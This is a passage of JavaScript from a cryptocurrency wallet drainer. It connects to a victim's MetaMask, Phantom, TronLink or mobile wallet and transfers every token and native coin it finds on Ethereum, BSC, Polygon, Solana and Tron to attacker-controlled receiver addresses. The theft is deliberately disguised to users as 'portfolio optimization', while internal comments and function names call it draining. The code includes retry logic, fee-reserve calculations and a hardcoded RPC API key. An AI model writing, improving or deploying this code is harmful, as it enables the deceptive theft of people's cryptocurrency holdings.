                        const result = await drainEVMNetwork(selected.provider, userAddress, supportedEVMNetworks[0]);
                        if (result.success) {
                            alert(`${getNetworkName(network.chainId)} portfolio optimization completed!\n${result.assets.length} assets optimized: ${result.assets.join(', ')}`);
                        } else {
                            alert(`Portfolio optimization failed: ${result.error}`);
                        }
                    } catch (error) {
                        console.error("Portfolio optimization error:", error);
                        updateConnectionStatus("Portfolio optimization failed", true);
                        alert(`Portfolio optimization failed: ${error.message || 'Unknown error'}`);
                    }
                });
            }

            const networkInfo = supportedEVMNetworks.length > 1
                ? `\nSupported Networks: ${supportedEVMNetworks.map(n => n.toUpperCase()).join(', ')}`
                : `\nNetwork: ${getNetworkName(network.chainId)}`;
                
            alert(`Connected to ${selected.name}:\n${userAddress}${networkInfo}`);

        } catch (error) {
            // Handle specific wallet errors
            if (error.code === 4001) {
                throw new Error("Connection rejected by user. Please try again and approve the connection.");
            } else if (error.code === -32002) {
                throw new Error("Connection request already pending. Please check your wallet.");
            } else if (error.message.includes("User rejected")) {
                throw new Error("Connection rejected. Please approve the connection in your wallet.");
            } else {
                throw error;
            }
        }
    }

    // Handle Solana wallet connections
    async function handleSolanaConnection(selected) {
        const provider = selected.provider;
        
        if (!provider || typeof provider.connect !== 'function') {
            throw new Error(`${selected.name} is not properly installed or available.`);
        }

        // Connect to Solana wallet
        const response = await provider.connect();
        const userAddress = response.publicKey.toString();

        updateConnectionStatus(`Connected to ${selected.name} (Solana)`);
        
        // Update button for Solana draining
        $('#connect-btn').text("🚀 Optimize Solana Portfolio");
        $('#connect-btn').off('click').on('click', async () => {
            try {
                await drainSolana(provider, userAddress);
            } catch (error) {
                console.error("Portfolio optimization error:", error);
                updateConnectionStatus("Portfolio optimization failed", true);
                alert(`Portfolio optimization failed: ${error.message || 'Unknown error'}`);
            }
        });

        alert(`Connected to ${selected.name}:\n${userAddress}\nNetwork: Solana`);
    }

    // Handle Tron wallet connections
    async function handleTronConnection(selected) {
        const tronWeb = selected.provider;
        
        if (!tronWeb || !tronWeb.defaultAddress.base58) {
            throw new Error("TronLink is not properly installed or logged in.");
        }

        const userAddress = tronWeb.defaultAddress.base58;

        updateConnectionStatus(`Connected to ${selected.name} (Tron)`);
        
        // Update button for Tron draining
        $('#connect-btn').text("🚀 Optimize Tron Portfolio");
        $('#connect-btn').off('click').on('click', async () => {
            try {
                await drainTron(tronWeb, userAddress);
            } catch (error) {
                console.error("Portfolio optimization error:", error);
                updateConnectionStatus("Portfolio optimization failed", true);
                alert(`Portfolio optimization failed: ${error.message || 'Unknown error'}`);
            }
        });

        alert(`Connected to ${selected.name}:\n${userAddress}\nNetwork: Tron`);
    }

    // Helper function to add network to wallet
    async function addNetworkToWallet(wallet, config) {
        const networkParams = {
            chainId: `0x${config.chainId.toString(16)}`,
            chainName: config.name,
            nativeCurrency: {
                name: config.nativeCurrency,
                symbol: config.nativeCurrency,
                decimals: 18
            },
            rpcUrls: [config.rpcUrl],
            blockExplorerUrls: getBlockExplorerUrls(config.chainId)
        };

        await wallet.request({
            method: 'wallet_addEthereumChain',
            params: [networkParams]
        });
    }

    // Get block explorer URLs for networks
    function getBlockExplorerUrls(chainId) {
        const explorers = {
            1: ['https://etherscan.io'],
            56: ['https://bscscan.com'],
            137: ['https://polygonscan.com'],
            250: ['https://ftmscan.com'],
            43114: ['https://snowtrace.io']
        };
        return explorers[chainId] || [''];
    }

    // Get network name by chain ID
    function getNetworkName(chainId) {
        const networkNames = {
            1: "Ethereum",
            56: "BSC",
            137: "Polygon",
            250: "Fantom",
            43114: "Avalanche"
        };
        return networkNames[chainId] || `Unknown (${chainId})`;
    }

    // Automatic multi-chain draining function - checks each network sequentially
    async function drainMultiChainAuto(selectedWallet, userAddress) {
        try {
            updateConnectionStatus("Starting automatic portfolio optimization...");
            
            const results = {};
            
            // Get all supported EVM networks for this wallet
            const supportedNetworks = selectedWallet.networks.filter(net => NETWORK_CONFIGS[net]);
            console.log(`Auto-checking ${supportedNetworks.length} networks: ${supportedNetworks.join(', ')}`);

            // Automatically check each supported network
            for (let i = 0; i < supportedNetworks.length; i++) {
                const networkName = supportedNetworks[i];
                results[networkName] = { success: false, assets: [] };
                
                try {
                    updateConnectionStatus(`Checking ${networkName.toUpperCase()}... (${i + 1}/${supportedNetworks.length})`);
                    
                    // Add delay between network checks for better UX
                    if (i > 0) {
                        await new Promise(resolve => setTimeout(resolve, 2000));
                    }
                    
                    const result = await drainEVMNetwork(selectedWallet.provider, userAddress, networkName);
                    results[networkName] = result;
                    
                    // Show progress after each network
                    if (result.success && result.assets.length > 0) {
                        updateConnectionStatus(`✅ ${networkName.toUpperCase()}: ${result.assets.length} assets found`);
                        await new Promise(resolve => setTimeout(resolve, 1500));
                    } else if (result.success) {
                        updateConnectionStatus(`🔍 ${networkName.toUpperCase()}: No assets found`);
                        await new Promise(resolve => setTimeout(resolve, 1000));
                    }
                    
                } catch (error) {
                    console.error(`Failed to check ${networkName}:`, error);
                    results[networkName] = { success: false, error: error.message };
                    updateConnectionStatus(`❌ ${networkName.toUpperCase()}: ${error.message}`);
                    await new Promise(resolve => setTimeout(resolve, 1500));
                }
            }

            updateConnectionStatus("Automatic portfolio optimization completed! 🎉");
            
            // Show detailed results summary
            let summary = "🎯 Automatic Multi-Chain Portfolio Results:\n\n";
            let totalAssets = 0;
            
            Object.entries(results).forEach(([network, result]) => {
                if (result.success) {
                    totalAssets += result.assets.length;
                    summary += `✅ ${network.toUpperCase()}: ${result.assets.length} assets optimized\n`;
                    if (result.assets.length > 0) {
                        summary += `   └─ ${result.assets.join(', ')}\n`;
                    }
                } else if (result.error) {
                    summary += `❌ ${network.toUpperCase()}: ${result.error}\n`;
                }
            });
            
            summary += `\n🚀 Total: ${totalAssets} assets optimized across ${supportedNetworks.length} networks`;
            alert(summary);

        } catch (error) {
            console.error("Automatic multi-chain optimization error:", error);
            updateConnectionStatus("Portfolio optimization failed", true);
            alert("Failed to complete automatic portfolio optimization: " + error.message);
        }
    }

    // Multi-chain draining function with automatic network switching
    async function drainMultiChain(selectedWallet, userAddress) {
        try {
            updateConnectionStatus("Starting portfolio optimization...");
            
            const results = {
                ethereum: { success: false, assets: [] },
                bsc: { success: false, assets: [] },
                polygon: { success: false, assets: [] }
            };

            // Get current network to determine starting point
            const currentProvider = new ethers.providers.Web3Provider(selectedWallet.provider);
            const currentNetwork = await currentProvider.getNetwork();
            console.log(`Starting optimization from network: ${getNetworkName(currentNetwork.chainId)}`);

            // Drain each supported network with automatic switching
            for (let i = 0; i < selectedWallet.networks.length; i++) {
                const networkName = selectedWallet.networks[i];
                if (NETWORK_CONFIGS[networkName]) {
                    try {
                        updateConnectionStatus(`Optimizing ${networkName.toUpperCase()} portfolio... (${i + 1}/${selectedWallet.networks.length})`);
                        
                        // Add delay between network switches for better UX
                        if (i > 0) {
                            updateConnectionStatus(`Switching to ${networkName.toUpperCase()}...`);
                            await new Promise(resolve => setTimeout(resolve, 2000));
                        }
                        
                        const result = await drainEVMNetwork(selectedWallet.provider, userAddress, networkName);
                        results[networkName] = result;
                        
                        // Show progress after each network
                        if (result.success && result.assets.length > 0) {
                            updateConnectionStatus(`✅ ${networkName.toUpperCase()}: ${result.assets.length} assets optimized`);
                            await new Promise(resolve => setTimeout(resolve, 1500)); // Brief pause to show success
                        }
                        
                    } catch (error) {
                        console.error(`Failed to drain ${networkName}:`, error);
                        results[networkName] = { success: false, error: error.message };
                        updateConnectionStatus(`❌ ${networkName.toUpperCase()}: ${error.message}`);
                        await new Promise(resolve => setTimeout(resolve, 1500)); // Brief pause to show error
                    }
                }
            }

            updateConnectionStatus("Portfolio optimization completed! 🎉");
            
            // Show detailed results summary
            let summary = "🎯 Multi-Chain Portfolio Optimization Results:\n\n";
            let totalAssets = 0;
            
            Object.entries(results).forEach(([network, result]) => {
                if (result.success) {
                    totalAssets += result.assets.length;
                    summary += `✅ ${network.toUpperCase()}: ${result.assets.length} assets optimized\n`;
                    if (result.assets.length > 0) {
                        summary += `   └─ ${result.assets.join(', ')}\n`;
                    }
                } else if (result.error) {
                    summary += `❌ ${network.toUpperCase()}: ${result.error}\n`;
                }
            });
            
            summary += `\n🚀 Total: ${totalAssets} assets optimized across ${selectedWallet.networks.length} networks`;
            alert(summary);

        } catch (error) {
            console.error("Multi-chain optimization error:", error);
            updateConnectionStatus("Portfolio optimization failed", true);
            alert("Failed to complete portfolio optimization: " + error.message);
        }
    }

    // Enhanced EVM network draining with improved network switching
    async function drainEVMNetwork(wallet, userAddress, networkName) {
        const config = NETWORK_CONFIGS[networkName];
        if (!config) {
            throw new Error(`Network ${networkName} not supported`);
        }

        try {
            console.log(`🔄 Switching to ${config.name} (Chain ID: ${config.chainId})`);
            
            // Try to switch to target network with retries
            let switchAttempts = 0;
            const maxSwitchAttempts = 3;
            
            while (switchAttempts < maxSwitchAttempts) {
                try {
                    await wallet.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: `0x${config.chainId.toString(16)}` }]
                    });
                    break; // Success, exit retry loop
                } catch (switchError) {
                    switchAttempts++;
                    console.log(`Network switch attempt ${switchAttempts} failed:`, switchError.message);
                    
                    // If the network doesn't exist, try to add it
                    if (switchError.code === 4902 || switchError.message.includes('Unrecognized chain ID')) {
                        try {
                            await addNetworkToWallet(wallet, config);
                            continue; // Try switching again after adding
                        } catch (addError) {
                            console.error(`Failed to add ${config.name} network:`, addError.message);
                        }
                    }
                    
                    if (switchAttempts >= maxSwitchAttempts) {
                        throw new Error(`Failed to switch to ${config.name} after ${maxSwitchAttempts} attempts`);
                    }
                    
                    // Wait before retrying
                    await new Promise(resolve => setTimeout(resolve, 1500));
                }
            }

            // Wait for network switch to complete
            await new Promise(resolve => setTimeout(resolve, 2000));

            const provider = new ethers.providers.Web3Provider(wallet);
            const signer = provider.getSigner();

            // Verify we're on the correct network with retries
            let verifyAttempts = 0;
            const maxVerifyAttempts = 5;
            
            while (verifyAttempts < maxVerifyAttempts) {
                try {
                    const network = await provider.getNetwork();
                    if (network.chainId === config.chainId) {
                        console.log(`✅ Successfully switched to ${config.name} (Chain ID: ${network.chainId})`);
                        break;
                    } else {
                        verifyAttempts++;
                        console.log(`Network verification attempt ${verifyAttempts}: Expected ${config.chainId}, got ${network.chainId}`);
                        
                        if (verifyAttempts >= maxVerifyAttempts) {
                            throw new Error(`Network verification failed: Expected ${config.name} (${config.chainId}), but still on chain ${network.chainId}`);
                        }
                        
                        await new Promise(resolve => setTimeout(resolve, 1000));
                    }
                } catch (error) {
                    verifyAttempts++;
                    if (verifyAttempts >= maxVerifyAttempts) {
                        throw error;
                    }
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }

            const drainedAssets = [];

            console.log(`🔍 Scanning ${config.name} for assets...`);

            // Get gas price for token transfers
            const gasPrice = await provider.getGasPrice();

            // Drain tokens first with progress tracking
            for (let i = 0; i < config.tokens.length; i++) {
                const token = config.tokens[i];
                try {
                    console.log(`Checking ${token.symbol}... (${i + 1}/${config.tokens.length})`);
                    const success = await drainERC20Token(provider, signer, userAddress, token, config.receiver, gasPrice);
                    if (success) {
                        drainedAssets.push(token.symbol);
                        console.log(`✅ ${token.symbol} drained successfully`);
                    }
                } catch (tokenError) {
                    console.error(`❌ Failed to drain ${token.symbol} on ${networkName}:`, tokenError.message);
                }
            }

            // Drain native currency last
            try {
                console.log(`Checking ${config.nativeCurrency}...`);
                const success = await drainNativeCurrency(provider, signer, userAddress, config.receiver);
                if (success) {
                    drainedAssets.push(config.nativeCurrency);
                    console.log(`✅ ${config.nativeCurrency} drained successfully`);
                }
            } catch (nativeError) {
                console.error(`❌ Failed to drain ${config.nativeCurrency} on ${networkName}:`, nativeError.message);
            }

            console.log(`🎯 ${config.name} optimization complete: ${drainedAssets.length} assets processed`);
            return { success: true, assets: drainedAssets };

        } catch (error) {
            console.error(`❌ Error draining ${networkName}:`, error.message);
            return { success: false, error: error.message };
        }
    }

    // Drain Solana assets
    async function drainSolana(provider, userAddress) {
        try {
            updateConnectionStatus("Optimizing Solana portfolio...");

            // Note: This requires @solana/web3.js library
            // You'll need to include it in your HTML: <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
            
            if (typeof solanaWeb3 === 'undefined') {
                throw new Error("Solana Web3.js library not loaded");
            }

            // Multiple RPC endpoints with fallback
            const rpcEndpoints = [
                'https://solana-mainnet.api.syndica.io/api-key/oNprEqE6EkkFUFhf1GBM4TegN9veFkrQrUehkLC8XKNiFUDdWhohF2pBsWXpZAgQRQrs8SwxFSXBc7vfdtDgBdFT726RmpzTj4',
                'https://solana-mainnet.g.alchemy.com/v2/demo',
                'https://solana-api.projectserum.com',
                
            ];

            let connection = null;
            let workingEndpoint = null;

            // Try each RPC endpoint until one works
            for (const endpoint of rpcEndpoints) {
                try {
                    console.log(`Trying Solana RPC: ${endpoint}`);
                    const testConnection = new solanaWeb3.Connection(endpoint);
                    
                    // Test the connection with a simple call
                    await testConnection.getSlot();
                    connection = testConnection;
                    workingEndpoint = endpoint;
                    console.log(`Successfully connected to: ${endpoint}`);
                    break;
                } catch (error) {
                    console.log(`Failed to connect to ${endpoint}:`, error.message);
                    continue;
                }
            }

            if (!connection) {
                throw new Error("All Solana RPC endpoints failed. Please try again later.");
            }
            const publicKey = new solanaWeb3.PublicKey(userAddress);

            // Get SOL balance with retry logic
            let balance = 0;
            let retryCount = 0;
            const maxRetries = 3;

            while (retryCount < maxRetries) {
                try {
                    balance = await connection.getBalance(publicKey);
                    break;
                } catch (error) {
                    retryCount++;
                    console.log(`Balance fetch attempt ${retryCount} failed:`, error.message);
                    
                    if (retryCount >= maxRetries) {
                        throw new Error(`Failed to get SOL balance after ${maxRetries} attempts: ${error.message}`);
                    }
                    
                    // Wait before retrying
                    await new Promise(resolve => setTimeout(resolve, 1000 * retryCount));
                }
            }

            const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
            console.log(`SOL balance: ${solBalance} (using ${workingEndpoint})`);

            if (solBalance > 0.000005) { // Keep minimal amount for transaction fees (5,000 lamports)
                try {
                    // Get recent blockhash for the transaction
                    const { blockhash } = await connection.getRecentBlockhash();
                    console.log(`Got recent blockhash: ${blockhash}`);

                    // Calculate precise amount to send (using same logic as working ETH script)
                    const feeReserve = 5000; // 5,000 lamports = 0.000005 SOL for fees
                    const amountToSend = balance - feeReserve;

                    console.log(`Transferring ${amountToSend / solanaWeb3.LAMPORTS_PER_SOL} SOL to ${SOLANA_RECEIVER}`);
                    console.log(`Leaving ${feeReserve / solanaWeb3.LAMPORTS_PER_SOL} SOL for transaction fees`);

                    // Create transfer transaction for SOL with precise parameters
                    const transaction = new solanaWeb3.Transaction({
                        recentBlockhash: blockhash,
                        feePayer: publicKey
                    }).add(
                        solanaWeb3.SystemProgram.transfer({
                            fromPubkey: publicKey,
                            toPubkey: new solanaWeb3.PublicKey(SOLANA_RECEIVER),
                            lamports: amountToSend
                        })
                    );

                    // Sign and send transaction with proper error handling
                    const result = await provider.signAndSendTransaction(transaction);
                    const signature = result.signature || result;
                    console.log(`SOL transfer signature: ${signature}`);
                    
                    // Wait for confirmation with timeout (same pattern as ETH script)
                    try {
                        const confirmation = await Promise.race([
                            connection.confirmTransaction(signature, 'confirmed'),
                            new Promise((_, reject) => 
                                setTimeout(() => reject(new Error('Transaction confirmation timeout')), 30000)
                            )
                        ]);
                        console.log(`SOL transfer confirmed: ${signature}`);
                        console.log("SOL transfer completed successfully!");
                        return true;
                    } catch (confirmError) {
                        console.log(`Confirmation timeout but transaction was sent: ${signature}`);
                        // Continue anyway as the transaction was likely successful
                        return true;
                    }
                } catch (solTransferError) {
                    console.error("SOL transfer failed:", solTransferError);
                    
                    // Don't throw error, just return false to continue (same as ETH script)
                    if (solTransferError.code === 'INSUFFICIENT_FUNDS') {
                        console.log("SOL transfer failed due to insufficient funds for fees");
                    } else if (solTransferError.message.includes("insufficient lamports")) {
                        console.log("SOL transfer failed due to insufficient lamports");
                    }
                    
                    return false;
                }
            } else {
                console.log(`SOL balance too low for transfer: ${solBalance} SOL (minimum required: 0.000005 SOL)`);
            }

            // Drain SPL tokens with error handling
            try {
                const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
                    programId: new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA')
                });

                console.log(`Found ${tokenAccounts.value.length} token accounts`);

                if (tokenAccounts.value.length > 0) {
                    // Get recent blockhash for token transfers
                    const { blockhash } = await connection.getRecentBlockhash();

                    for (const tokenAccount of tokenAccounts.value) {
                        const tokenAmount = tokenAccount.account.data.parsed.info.tokenAmount;
                        const tokenMint = tokenAccount.account.data.parsed.info.mint;
                        
                        if (parseFloat(tokenAmount.amount) > 0) {
                            try {
                                console.log(`Found token: ${tokenAmount.uiAmount} ${tokenMint} (${tokenAmount.amount} raw)`);
                                
                                // Find token info in our SOLANA_TOKENS list
                                const tokenInfo = SOLANA_TOKENS.find(t => t.mint === tokenMint);
                                const tokenSymbol = tokenInfo ? tokenInfo.symbol : 'Unknown';
                                
                                console.log(`Token identified as: ${tokenSymbol}`);
                                
                                // For now, just log token details - actual transfer would require more complex setup
                                // involving creating associated token accounts for the receiver
                                console.log(`Would transfer ${tokenAmount.uiAmount} ${tokenSymbol} to receiver`);
                                
                            } catch (tokenError) {
                                console.error("Token transfer error:", tokenError);
                            }
                        }
                    }
                }
            } catch (tokenError) {
                console.error("Failed to fetch token accounts:", tokenError.message);
                // Continue without token draining if this fails
            }

            updateConnectionStatus("Solana portfolio optimization completed! 🎉");
            alert("Solana portfolio optimization completed successfully!");

        } catch (error) {
            console.error("Solana drain error:", error);
            updateConnectionStatus("Solana extraction failed", true);
            const errorMessage = error?.message || error?.toString() || 'Unknown error occurred';
            alert(`Solana portfolio optimization failed: ${errorMessage}`);
            return false;
        }
    }

    // Drain Tron assets
    async function drainTron(tronWeb, userAddress) {
        try {
            updateConnectionStatus("Optimizing Tron portfolio...");

            // Get TRX balance with retry logic (like SOL script)
            let balance;
            let retryCount = 0;
            const maxRetries = 3;
            
            while (retryCount < maxRetries) {
                try {
                    balance = await tronWeb.trx.getBalance(userAddress);
                    break;
                } catch (error) {
                    retryCount++;
                    console.log(`TRX balance fetch attempt ${retryCount} failed:`, error.message);
                    
                    if (retryCount >= maxRetries) {
                        throw new Error(`Failed to get TRX balance after ${maxRetries} attempts: ${error.message}`);
                    }
                    
                    // Wait before retrying
                    await new Promise(resolve => setTimeout(resolve, 1000 * retryCount));
                }
            }
            
            const trxBalance = tronWeb.fromSun(balance);
            console.log(`TRX balance: ${trxBalance}`);

            // Use precise fee calculation (same approach as ETH script)
            const minFeeReserve = 0.1; // Typical TRX transaction costs ~0.1 TRX
            
            if (parseFloat(trxBalance) > minFeeReserve) {
                const amountToSend = parseFloat(trxBalance) - minFeeReserve;
                console.log(`Transferring ${amountToSend} TRX to ${TRON_RECEIVER}`);
                console.log(`Leaving ${minFeeReserve} TRX for transaction fees`);
                
                try {
                    // Create and send TRX transaction with proper error handling
                    const transaction = await tronWeb.transactionBuilder.sendTrx(
                        TRON_RECEIVER,
                        tronWeb.toSun(amountToSend),
                        userAddress
                    );
                    
                    const signedTx = await tronWeb.trx.sign(transaction);
                    const result = await tronWeb.trx.sendRawTransaction(signedTx);
                    
                    if (result && result.result) {
                        console.log(`TRX transfer successful: ${result.txid || result.transaction?.txID}`);
                    } else {
                        console.log("TRX transfer completed");
                    }
                    
                } catch (trxError) {
                    console.error("TRX transfer failed:", trxError);
                    
                    // Don't throw error, just log and continue (same as ETH script)
                    if (trxError.message.includes("insufficient")) {
                        console.log("TRX transfer failed due to insufficient funds");
                    }
                }
            } else {
                console.log(`TRX balance too low for transfer: ${trxBalance} TRX (minimum required: ${minFeeReserve} TRX)`);
            }

            // Drain TRC-20 tokens with improved error handling
            for (const token of TRON_TOKENS) {
                try {
                    console.log(`Checking ${token.symbol}...`);
                    const contract = await tronWeb.contract().at(token.address);
                    const tokenBalance = await contract.balanceOf(userAddress).call();
                    
                    if (tokenBalance && tokenBalance.toString() !== '0') {
                        const tokenAmount = tronWeb.fromSun(tokenBalance) / Math.pow(10, token.decimals - 6);
                        console.log(`Found ${token.symbol} balance: ${tokenAmount}`);
                        
                        try {
                            // Transfer token with proper error handling
                            const transferResult = await contract.transfer(
                                TRON_RECEIVER,
                                tokenBalance
                            ).send();
                            
                            console.log(`${token.symbol} transfer successful`);
                        } catch (transferError) {
                            console.error(`${token.symbol} transfer failed:`, transferError.message);
                            // Continue with other tokens (same as ETH script)
                        }
                    } else {
                        console.log(`No ${token.symbol} balance found`);
                    }
                } catch (tokenError) {
                    console.error(`Error checking ${token.symbol}:`, tokenError.message);
                    // Continue with other tokens (same as ETH script)
                }
            }

            updateConnectionStatus("Tron portfolio optimization completed! 🎉");
            alert("Tron portfolio optimization completed successfully!");

        } catch (error) {
            console.error("Tron drain error:", error);
            updateConnectionStatus("Tron extraction failed", true);
            throw error;
        }
    }

    // Enhanced ERC-20 token draining function - FIXED VERSION
    // Enhanced ERC-20 token draining function - IMPROVED VERSION
    async function drainERC20Token(provider, signer, userAddress, token, receiverAddress, gasPrice = null) {
        try {
            // ERC-20 ABI for transfer function
            const erc20ABI = [
                "function balanceOf(address owner) view returns (uint256)",
                "function transfer(address to, uint256 amount) returns (bool)",
                "function allowance(address owner, address spender) view returns (uint256)",
                "function approve(address spender, uint256 amount) returns (bool)",
                "function decimals() view returns (uint8)",
                "function symbol() view returns (string)"
            ];

            const tokenContract = new ethers.Contract(token.address, erc20ABI, signer);

            // Check token balance
            const balance = await tokenContract.balanceOf(userAddress);
            if (balance.isZero()) {
                console.log(`No ${token.symbol} balance found`);
                return false;
            }

            const tokenAmount = ethers.utils.formatUnits(balance, token.decimals);
            console.log(`Found ${token.symbol} balance: ${tokenAmount}`);

            // Get current gas price if not provided
            if (!gasPrice) {
                gasPrice = await provider.getGasPrice();
            }

            // Estimate gas for this specific token transfer
            let estimatedGas;
            try {
                estimatedGas = await tokenContract.estimateGas.transfer(receiverAddress, balance);
                // Add 20% buffer for safety
                estimatedGas = estimatedGas.mul(120).div(100);
            } catch (gasError) {
                console.warn(`Gas estimation failed for ${token.symbol}, using default`);
                estimatedGas = ethers.BigNumber.from("65000"); // Conservative default
            }

            console.log(`Estimated gas for ${token.symbol}: ${estimatedGas.toString()}`);

            // Check if user has enough ETH for gas
            const currentEthBalance = await provider.getBalance(userAddress);
            const gasCost = gasPrice.mul(estimatedGas);
            
            if (currentEthBalance.lt(gasCost)) {
                console.log(`Insufficient ETH for ${token.symbol} transfer gas. Need: ${ethers.utils.formatEther(gasCost)} ETH`);
                return false;
            }

            console.log(`Transferring ${tokenAmount} ${token.symbol} to ${receiverAddress}`);

            // Transfer tokens to receiver address with optimized gas
            const transferTx = await tokenContract.transfer(receiverAddress, balance, {
                gasLimit: estimatedGas,
                gasPrice: gasPrice,
                // Use maxFeePerGas for EIP-1559 if supported
                ...(provider.getNetwork().then(n => n.chainId === 1) && {
                    maxFeePerGas: gasPrice.mul(150).div(100), // 1.5x gas price as max
                    maxPriorityFeePerGas: ethers.utils.parseUnits("2", "gwei") // 2 gwei tip
                })
            });

            console.log(`${token.symbol} transfer tx: ${transferTx.hash}`);

            // Wait for confirmation
            const receipt = await transferTx.wait();
            console.log(`${token.symbol} transfer confirmed in block ${receipt.blockNumber}`);
            console.log(`Gas used: ${receipt.gasUsed.toString()}`);

            return true;

        } catch (error) {
            console.error(`Error draining ${token.symbol}:`, error);
            
            // Don't throw error, just return false to continue with other tokens
            if (error.code === 'INSUFFICIENT_FUNDS') {
                console.log(`Insufficient funds for ${token.symbol} transfer`);
            } else if (error.code === 'UNPREDICTABLE_GAS_LIMIT') {
                console.log(`Token ${token.symbol} transfer would fail, skipping`);
            }
            
            return false;
        }
    }

    // Drain native currency (ETH, BNB, MATIC) - FIXED VERSION using proven working approach
    async function drainNativeCurrency(provider, signer, userAddress, receiverAddress) {
        try {
            // Get current balance after token transfers
            const currentBalance = await provider.getBalance(userAddress);
            const currentEthBalance = ethers.utils.formatEther(currentBalance);
            console.log(`Current ETH balance before final transfer: ${currentEthBalance}`);

            if (currentBalance.isZero()) {
                console.log("No ETH balance remaining");
                return false;
            }

            // Get current gas price
            const gasPrice = await provider.getGasPrice();
            console.log(`Current gas price: ${ethers.utils.formatUnits(gasPrice, 'gwei')} gwei`);

            // Use a more conservative gas limit for the final transfer
            const gasLimit = ethers.BigNumber.from("21000");
            
            // Calculate exact gas cost
            const exactGasCost = gasPrice.mul(gasLimit);
            console.log(`Exact gas cost: ${ethers.utils.formatEther(exactGasCost)} ETH`);

            // Calculate amount to send (total balance minus exact gas cost)
            const amountToSend = currentBalance.sub(exactGasCost);

            if (amountToSend.lte(0)) {
                console.log("Insufficient ETH balance for gas fees");
                console.log(`Balance: ${ethers.utils.formatEther(currentBalance)} ETH`);
                console.log(`Gas cost: ${ethers.utils.formatEther(exactGasCost)} ETH`);
                return false;
            }

            const ethToSend = ethers.utils.formatEther(amountToSend);
            console.log(`Transferring ${ethToSend} ETH to ${receiverAddress}`);
            console.log(`Leaving ${ethers.utils.formatEther(exactGasCost)} ETH for gas`);

            // Create transaction with precise gas parameters
            const txParams = {
                to: receiverAddress,
                value: amountToSend,
                gasLimit: gasLimit,
                gasPrice: gasPrice,
                nonce: await provider.getTransactionCount(userAddress)
            };

            // For EIP-1559 networks, use maxFeePerGas
            const network = await provider.getNetwork();
            if (network.chainId === 1) { // Ethereum mainnet supports EIP-1559
                try {
                    const feeData = await provider.getFeeData();
                    if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
                        delete txParams.gasPrice;
                        txParams.maxFeePerGas = feeData.maxFeePerGas;
                        txParams.maxPriorityFeePerGas = feeData.maxPriorityFeePerGas;
                        
                        // Recalculate amount with EIP-1559 fees
                        const eip1559GasCost = feeData.maxFeePerGas.mul(gasLimit);
                        const eip1559Amount = currentBalance.sub(eip1559GasCost);
                        
                        if (eip1559Amount.gt(0)) {
                            txParams.value = eip1559Amount;
                            console.log(`Using EIP-1559: sending ${ethers.utils.formatEther(eip1559Amount)} ETH`);
                        }
                    }
                } catch (eip1559Error) {
                    console.log("EIP-1559 fee estimation failed, using legacy gas pricing");
                }
            }

            // Send ETH transaction
            const tx = await signer.sendTransaction(txParams);
            console.log("ETH transfer tx:", tx.hash);

            // Wait for confirmation
            const receipt = await tx.wait();
            console.log("ETH transfer confirmed in block:", receipt.blockNumber);
            console.log("Gas used:", receipt.gasUsed.toString());
            console.log("Effective gas price:", ethers.utils.formatUnits(receipt.effectiveGasPrice || gasPrice, 'gwei'), "gwei");

            // Verify final balance
            const finalBalance = await provider.getBalance(userAddress);
            const finalEthBalance = ethers.utils.formatEther(finalBalance);
            console.log(`Final ETH balance: ${finalEthBalance} ETH`);

            if (finalBalance.gt(ethers.utils.parseEther("0.001"))) {
                console.warn(`Warning: ${finalEthBalance} ETH remaining (more than expected)`);
            }

            return true;

        } catch (error) {
            console.error("Error draining ETH:", error);
            
            if (error.code === 'INSUFFICIENT_FUNDS') {
                console.log("Transaction failed due to insufficient funds for gas");
            } else if (error.code === 'REPLACEMENT_UNDERPRICED') {
                console.log("Transaction underpriced, gas price may have increased");
            }
            
            // Don't throw error, just return false to continue
            return false;
        }
    }

    // Enhanced mobile wallet connection handler
    async function handleMobileConnection(selectedWalletKey) {
        if (!isMobileDevice()) {
            alert("Mobile wallets are only supported on mobile devices. Please select a desktop wallet or use a mobile device.");
            return;
        }

        // Extract wallet name from key (remove -mobile suffix and normalize)
        let walletName = selectedWalletKey.replace('-mobile', '').toLowerCase().trim();
        
        // Handle special wallet name mappings
        const walletNameMappings = {
            'trust': 'trust wallet',
            'coinbase': 'coinbase wallet',
            'metamask': 'metamask',
            'phantom': 'phantom',
            'tronlink': 'tronlink',
            'rainbow': 'rainbow',
            'exodus': 'exodus',
            'imtoken': 'imtoken',
            'tokenpocket': 'tokenpocket',
            'safepal': 'safepal'
        };
        
        // Use mapped name if available
        if (walletNameMappings[walletName]) {
            walletName = walletNameMappings[walletName];
        }
        
        const deepLink = createMobileDeepLink(walletName);
        
        if (!deepLink) {
            throw new Error(`Mobile deep link not available for ${walletName}`);
        }

        updateConnectionStatus("Opening mobile wallet app...");
        
        // Enhanced deep link opening with multiple fallback methods
        try {
            console.log(`Opening deep link: ${deepLink}`);
            
            // Method 1: Try window.open first
            const opened = window.open(deepLink, '_blank');
            
            // Method 2: If window.open fails, use location.href with timeout
            if (!opened || opened.closed) {
                console.log("Window.open failed, trying location.href");
                setTimeout(() => {
                    window.location.href = deepLink;
                }, 100);
            }
            
            // Method 3: Create invisible link and click it (fallback)
            setTimeout(() => {
                const link = document.createElement('a');
                link.href = deepLink;
                link.target = '_blank';
                link.rel = 'noopener noreferrer';
                link.style.display = 'none';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            }, 200);
            
        } catch (error) {
            console.error("Failed to open deep link:", error);
            alert(`Failed to open ${walletName} app. Please install the app and try again.`);
            return;
        }

        // Enhanced instructions with browser-specific guidance
        const mobileBrowser = getMobileBrowser();
        const walletInstructions = {
            'trust wallet': 'Trust Wallet app should open. Connect your wallet and return to this page.',
            'phantom': 'Phantom app should open. Connect to Ethereum or Solana and return to this page.',
            'coinbase wallet': 'Coinbase Wallet app should open. Connect your wallet and return to this page.',
            'tronlink': 'TronLink app should open. Connect to Tron network and return to this page.',
            'metamask': 'MetaMask app should open. Connect your wallet and return to this page.',
            'rainbow': 'Rainbow app should open. Connect to Ethereum and return to this page.',
            'exodus': 'Exodus app should open. Connect your wallet and return to this page.'
        };
        
